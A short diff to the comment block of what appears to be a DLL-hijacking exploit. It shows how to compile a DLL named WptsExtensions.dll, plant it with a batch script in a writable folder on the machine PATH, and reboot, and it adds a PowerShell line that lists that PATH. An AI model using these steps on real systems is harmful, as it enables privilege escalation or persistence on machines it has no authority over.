@@ -12,6 +12,7 @@ cl /LD /MT /EHa dllmain.cpp /Fe:WptsExtensions.dll
 const TCHAR script[] = TEXT("C:\\Python27\\script.bat");
 
 - Drop the DLL and script.bat in your writable directory (from the machine PATH)
+powershell -Command "[System.Environment]::GetEnvironmentVariable('PATH','Machine')"
 
 - Reboot
 ***/
